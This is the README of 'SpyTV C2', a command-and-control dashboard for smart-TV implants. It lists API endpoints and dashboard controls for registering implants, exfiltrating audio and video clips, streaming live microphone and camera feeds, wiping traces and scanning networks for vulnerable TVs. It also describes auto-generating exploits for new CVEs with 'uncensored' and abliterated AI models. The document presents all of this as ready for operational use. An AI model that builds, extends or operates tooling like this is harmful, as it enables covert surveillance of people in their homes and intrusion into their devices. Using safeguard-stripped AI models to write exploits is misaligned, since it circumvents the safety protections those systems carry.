# SpyTV C2 Dashboard

## Overview

The SpyTV C2 (Command & Control) server provides a web-based dashboard for managing TV implants. It handles audio/video exfiltration, device control, and command dispatch.

## Architecture

```
[TV Implant] <--HTTP--> [C2 Server :8443] <--HTTP/WebSocket--> [Web Dashboard]
```

- **C2 Server** (`c2_server.py`): Python HTTP server on port 8443
- **Dashboard** (`c2_dashboard.html`): Single-page JS app served by C2
- **Implant** (`tvreaper.js`): Polls C2 every 5 seconds for commands
- **Storage** (`c2_data/`): Clips, device registry, command queue

## Starting the C2

```bash
# Recommended: checks .env for AI keys (prompts to add/skip if none), then starts
run_c2.bat          # Windows
python c2_server.py # direct
```

The dashboard is available at `http://localhost:8443/`

## API Endpoints

### Device Management
- `POST /api/register` — Implant registers with C2
- `GET /api/devices` — List all connected devices

### Clip Exfiltration
- `POST /api/exfil` — Upload audio/video clip (headers: `X-Device-ID`, `X-Clip-Kind`)
- `GET /api/clips` — List all clips
- `GET /api/clip/<id>` — Download a specific clip

### Command Dispatch
- `POST /api/command` — Send command to device
- `POST /api/poll` — Implant polls for pending commands

### CVE Feed & Patching
- `GET /api/cve/feed` — Feed payload (entries, counts, last update, masked AI key status, `updating` flag)
- `POST /api/cve/update` — Fetch new CVEs from NVD in a background thread (also runs automatically at every C2 start); auto-generates an exploit per new CVE when an AI key is configured
- `GET /api/cves` — Static family → CVE database (8 TV families, 28 CVEs)
- `POST /api/cve/patch` — Execute a device family's remediation commands against `{ip, tv_type, family}`; returns per-command output + `cves_fixed`
- `POST /api/cve/generate` — Generate + save an exploit for `{cve_id}` via the configured provider
- `GET /api/cve/whitepaper/<id>` — Per-CVE whitepaper (HTML)
- `GET /api/ai-keys` — Masked AI provider key status
- `POST /api/ai-keys` — Save keys to `c2_data/ai_keys.json`
- `GET /docs/<name>.md` — Any repo doc rendered as HTML (e.g. `/docs/TROUBLESHOOTING.md`)

### Scanning
- `POST /api/scan` — Port-scan a CIDR; merges CVE-database signature ports (Samsung 26101, LG 30000, Chromecast 8009, Hisense 56789, …) and attaches matched CVEs, severity, MAC, Bluetooth, SSH flags per host
- `GET /api/scans` — Recent scan history

## Dashboard Features

### CVE Feed (right sidebar)
- Refreshes at C2 startup, on "Update CVEs", and every 60s
- Each entry: CVE ID (links to NVD), severity badge, description, **NVD Advisory** + **Whitepaper** links, "exploit ready" marker when AI generation succeeded
- Update log: `CVE_UPDATES.log` in the repository root (also replayed into the feed if the state file is cleared)

### AI Provider Keys (CVE Monitor tab)
Keys for automatic exploit generation on each newly published CVE:

| Provider | Models |
|----------|--------|
| OpenRouter | Uncensored |
| Venice AI | Uncensored V 1.2, Qwen 3.6 Plus Uncensored, GLM 4.7 Flash Heretic |
| Abliteration.ai | Abliterated Large v2 |

Resolution order: dashboard-saved `c2_data/ai_keys.json` → `.env` (written by `run_c2.bat`) → process env. Keys display masked after saving.

### Network Scan
- Scans generic ports **plus** every CVE-database family signature port
- Results show CVE chips (severity-colored), Check / Exploit / **Patch** buttons per device

### Device Grid (2x2)
Shows up to 4 connected devices with:
- IP address, family, entry method
- Online/offline status
- Video thumbnail grid (2x2, latest 4 frames)
- Audio player (latest clip)
- **CVE chips for the device's family** (marked "Patched" after remediation)

### Per-Device Controls
| Button | Command | Description |
|--------|---------|-------------|
| Record Audio | `record_audio` | Record audio for 1-20 minutes |
| Record Video | `record_video` | Record video for 1-20 minutes |
| Listen | `listen` | Stream live audio for 60 seconds |
| Watch | `watch` | Stream live video for 60 seconds |
| Remove | `remove` | Wipe implant and all traces |
| Patch | `patch` + `POST /api/cve/patch` | Executes the family's CVE remediation commands against the TV (per-command output shown in the Activity Log), marks its CVEs fixed, and disables the implant capture path |

### Duration Selection
Choose recording duration: 1, 2, 5, 10, 15, or 20 minutes.

### Activity Log
Shows timestamped command history with "Clear Logs" button.

## File Structure

```
c2_server.py          — C2 HTTP server
c2_cve_feed.py        — CVE feed manager (NVD fetch, root update log, AI exploit gen)
c2_dashboard.html     — Web dashboard (served at /)
run_c2.bat            — Launcher: checks .env for AI keys (prompt/skip), starts C2
.env.example          — Template for AI provider keys + NVD key
logo.png              — C2 logo (served at /logo.png)
tvreaper.js           — Updated implant with C2 polling
CVE_UPDATES.log       — Root-level CVE update log (JSONL; replayed into the feed)
c2_data/
  cve_state.json      — Known-CVE state (feed source of truth)
  ai_keys.json        — Saved AI provider keys (git-ignored)
  devices.json        — Device registry
  commands.json       — Command queue
  clips/
    audio/            — Audio clips (.wav)
    video/            — Video clips (.jpeg)
data/exploits/generated/
  CVE-*.py            — AI-generated exploit modules, one per new CVE
```

## Documentation from the C2

- Header **Wiki** and **Troubleshooting** links open repo docs rendered by the
  C2 itself (`/docs/WIKI.md`, `/docs/TROUBLESHOOTING.md`) — no file:// paths,
  works from any machine that can reach the dashboard.
- Any `docs/*.md` is reachable at `/docs/<name>.md`.

## Security Notes

- The C2 binds to `0.0.0.0:8443` by default. For operational use, restrict to localhost or use a reverse proxy with authentication.
- Clips are stored unencrypted on disk.
- No authentication on the dashboard — add auth before operational deployment.
- The implant polls over HTTPS in production (update `c2Base` in `CONFIG`).
